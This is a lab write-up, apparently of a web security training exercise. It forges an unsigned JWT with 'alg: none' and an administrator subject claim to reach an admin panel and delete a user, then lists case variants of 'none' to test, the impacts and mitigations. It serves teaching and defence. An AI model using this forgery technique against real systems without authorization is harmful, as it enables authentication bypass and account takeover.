# Lab02 - JWT Authentication Bypass Via Flawed Signature Verification

## Objective

Forge an unsigned JWT that grants access to:

```text
/admin
```

Then delete:

```text
carlos
```

Credentials:

```text
wiener:peter
```

---

# Vulnerability Overview

The server is insecurely configured to accept unsigned JWTs.

The JWT `alg` header parameter controls the signature algorithm.

The vulnerable application accepts:

```json
{
  "alg": "none"
}
```

---

# Important JWT Rule

Even when the signature is removed, the JWT must retain the trailing dot.

Correct structure:

```text
HEADER.PAYLOAD.
```

Incorrect:

```text
HEADER.PAYLOAD
```

---

# Analysis & Exploitation Steps

## Step 1 - Log In

Log in:

```text
wiener:peter
```

---

## Step 2 - Find The JWT

In Burp:

```text
Proxy
        ↓
HTTP history
```

Find:

```http
GET /my-account
```

Observe the JWT session cookie.

---

## Step 3 - Inspect The Payload

Decode the JWT payload using Burp Inspector.

Observe:

```json
{
  "sub": "wiener"
}
```

Send the request to Repeater.

---

## Step 4 - Test Admin Access

Change the path:

```http
GET /admin
```

Send the request.

Access is denied.

---

## Step 5 - Modify The Subject Claim

Change:

```json
{
  "sub": "wiener"
}
```

To:

```json
{
  "sub": "administrator"
}
```

Click:

```text
Apply changes
```

---

## Step 6 - Change The Algorithm

Select the JWT header.

Original:

```json
{
  "alg": "HS256"
}
```

Change to:

```json
{
  "alg": "none"
}
```

Click:

```text
Apply changes
```

---

## Step 7 - Remove The Signature

Remove the JWT signature.

The final JWT structure should be:

```text
HEADER.PAYLOAD.
```

Remember:

```text
KEEP THE TRAILING DOT
```

---

## Step 8 - Access The Admin Panel

Send:

```http
GET /admin
```

The server accepts the unsigned JWT.

Admin access is granted.

---

## Step 9 - Delete Carlos

Send:

```http
GET /admin/delete?username=carlos
```

Lab solved.

---

# Why The Attack Works

The server trusts the attacker-controlled `alg` header.

```text
alg = none
        ↓
Server Skips Signature Verification
        ↓
Modified sub Claim Accepted
        ↓
Administrator Access
```

---

# Personal Analysis & Testing Process

The important attack chain is:

```text
Modify sub
        +
Set alg = none
        +
Remove Signature
        +
Keep Trailing Dot
```

My quick testing logic:

```text
JWT Found
        ↓
Inspect alg
        ↓
Test Unsigned Token Handling
        ↓
Observe Server Response
```

---

# Bug Bounty Indicators

```text
JWT Authentication
User-Controlled alg
Old JWT Implementations
Unexpected Acceptance Of Unsigned Tokens
```

Interesting values during authorized testing:

```text
none
None
NONE
nOnE
```

Parsing behavior can differ between implementations.

---

# Impact

```text
Authentication Bypass
Privilege Escalation
User Impersonation
Account Takeover
```

---

# Mitigation

- Reject unsigned JWTs.
- Pin the expected signing algorithm server-side.
- Never trust `alg` directly from an unverified token.
- Use maintained JWT libraries.

---

# Related Theory

```text
05-flawed-signature-verification.md
07-alg-none-vulnerability.md
```

---

# Key Learnings

- `alg` is attacker-controlled input.
- Unsigned JWTs can be dangerous.
- A trailing dot is required for an unsigned JWT structure.
- The server should define the expected algorithm.